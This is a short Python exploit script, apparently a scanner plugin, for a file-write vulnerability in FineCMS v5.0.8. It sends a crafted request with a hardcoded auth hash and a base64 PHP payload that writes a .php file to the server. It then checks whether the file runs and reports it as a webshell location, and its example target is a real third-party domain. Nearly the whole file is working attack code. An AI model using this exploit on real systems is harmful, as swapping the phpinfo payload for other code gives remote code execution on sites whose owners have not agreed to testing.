#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: finecmsV5.0.8写文件漏洞
referer: unknown
author: qianxiao996
description: finecmsV5.0.8写文件漏洞分析
'''
import sys
import requests
import warnings

  
#方法名称自定义
class v508_write_file:
    def __init__(self, url):
        self.url = url

    def run(self):

        returnresult = ['finecmsV5.0.8写文件漏洞', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload="/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+"
        url=self.url+payload
        shell=self.url+'/uploadfile/member/0/0x0.php'
        try:
            result=requests.get(url,headers=headers, verify=False,timeout =5)
            verify=requests.get(shell,headers=headers, verify=False,timeout =5)
            if verify.status_code==200 and 'code' in verify.text:
                returnresult[2]='存在'
                returnresult[1] = "Webshell位置:%s"%shell
            else:
                returnresult[2]=  '不存在'
        except:
            returnresult[2]='不存在'
        return returnresult

if __name__ == "__main__":
    #此处不会调用
    warnings.filterwarnings("ignore")
    testVuln = v508_write_file("http://baidu.com")
    testVuln.run()